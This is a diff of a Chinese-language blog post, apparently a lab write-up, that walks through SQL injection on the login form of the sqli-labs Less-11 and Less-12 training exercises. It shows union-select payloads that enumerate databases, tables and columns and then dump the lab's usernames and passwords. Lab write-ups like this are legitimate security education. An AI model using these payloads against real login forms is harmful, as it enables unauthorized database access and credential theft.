@@ -87,38 +87,30 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1>Less-11</h1>
-进入 http://127.0.0.1/sql/Less-11 ，显示如下：
-![1](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/1.png)
-都输入admin进行登入：
-![2](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/2.png)
-然后进行sql注入判断，在username输入admin'，在password输入admin，显示如下：
-![3](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/3.png)
-说明有sql注入漏洞，再在username输入admin'#,password不变，正常登入，说明可以用`‘`注入。
-也可以在username输入admin\，password不输，显示如下：
-![4](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/4.png)
-看到\后面是`'`，说明可以用`'`注入。
-在username输入admin' order by 2#，正常输出，说明数据有两列。
-再在username输入1admin' union select 1,2#(前面的1和less-1的id=-1是一样的道理)：
-![5](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/5.png)
-可以看到1在username输出，2在password输出。
-在username输入1admin' union select 1,database()#：(也可以用1admin' union select 1,schema_name from information_schema.schemata limit 4,1#(这个要一个一个查)或1admin' union select 1,group_concat(schema_name) from information_schema.schemata#(查全部库名))
-![6](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/6.png)
-可以看到在password输出了库名：security
-再在username输入1admin' union select 1,table_name from information_schema.tables where table_schema='security' limit 0,1#(也可以用1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#)(以下都是用group_concat函数的)
-![7](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/7.png)
-得到表名：emails,referers,uagents,users
-再在username输入1admin' union select 1,column_name from information_schema.columns where table_name='users' limit 0,1#(也可以用1admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#)
-![8](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/8.png)
-得到列名：id,username,password
-再在username输入1admin' union select username,password from users limit 0,1#(也可以用1admin' union select group_concat(username),group_concat(password) from users#)
-![9](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/9.png)
-得到用户名和密码：
-username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
-password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
 
-
+<p>进入 <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-11">http://127.0.0.1/sql/Less-11</a> ，显示如下：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/1.png" alt="1"></p>
+<p>都输入admin进行登入：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/2.png" alt="2"></p>
+<p>然后进行sql注入判断，在username输入admin’，在password输入admin，显示如下：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/3.png" alt="3"></p>
+<p>说明有sql注入漏洞，再在username输入admin’#,password不变，正常登入，说明可以用<code>‘</code>注入。<br>也可以在username输入admin\，password不输，显示如下：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/4.png" alt="4"></p>
+<p>看到\后面是<code>&#39;</code>，说明可以用<code>&#39;</code>注入。</p>
+<p>在username输入admin’ order by 2#，正常输出，说明数据有两列。<br>再在username输入1admin’ union select 1,2#(前面的1和less-1的id=-1是一样的道理)：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/5.png" alt="5"></p>
+<p>可以看到1在username输出，2在password输出。<br>在username输入1admin’ union select 1,database()#：(也可以用1admin’ union select 1,schema_name from information_schema.schemata limit 4,1#(这个要一个一个查)或1admin’ union select 1,group_concat(schema_name) from information_schema.schemata#(查全部库名))</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/6.png" alt="6"></p>
+<p>可以看到在password输出了库名：security<br>再在username输入1admin’ union select 1,table_name from information_schema.tables where table_schema=’security’ limit 0,1#(也可以用1admin’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’#)(以下都是用group_concat函数的)</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/7.png" alt="7"></p>
+<p>得到表名：emails,referers,uagents,users<br>再在username输入1admin’ union select 1,column_name from information_schema.columns where table_name=’users’ limit 0,1#(也可以用1admin’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#)</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/8.png" alt="8"></p>
+<p>得到列名：id,username,password<br>再在username输入1admin’ union select username,password from users limit 0,1#(也可以用1admin’ union select group_concat(username),group_concat(password) from users#)</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/9.png" alt="9"></p>
+<p>得到用户名和密码：<br>username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
 <h1>Less-12</h1>
-和Less-11一样，只是把'换成了")。
+
+<p>和Less-11一样，只是把’换成了”)。</p>
 
       
     </div>
